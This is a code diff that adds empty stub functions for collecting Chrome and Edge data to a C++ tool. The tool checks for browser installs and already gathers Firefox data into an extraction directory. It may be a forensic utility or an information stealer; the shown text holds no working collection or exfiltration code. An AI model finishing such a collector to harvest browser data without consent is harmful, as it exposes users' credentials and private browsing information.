@@ -19,6 +19,8 @@ namespace fs = std::filesystem;
 
 bool verify_browser_installation(const LPCWSTR p_name);
 void collect_firefox_data(std::string p_path_to_extraction_directory);
+void collect_chrome_data(std::string p_path_to_extraction_directory);
+void collect_edge_data(std::string p_path_to_extraction_directory);
 
 // Helper functions
 wchar_t* convert_to_wchar(const char* charArray);
@@ -37,13 +39,13 @@ int main(int argc, char** argv) {
 	// Chrome
 	if (verify_browser_installation(L"Software\\Google\\Chrome"))
 	{
-		
+		collect_chrome_data(path_to_extraction_directory);
 	}
 
 	// Edge
 	if (verify_browser_installation(L"Software\\Microsoft\\Edge"))
 	{
-		
+		collect_edge_data(path_to_extraction_directory);
 	}
 
 	return 0;
@@ -139,6 +141,14 @@ void collect_firefox_data(std::string p_path_to_extraction_directory) {
 			}
 		}
 	}
+}
+
+void collect_chrome_data(std::string p_path_to_extraction_directory) {
+
+}
+
+void collect_edge_data(std::string p_path_to_extraction_directory) {
+
 }
 
 std::string create_extraction_directory() {
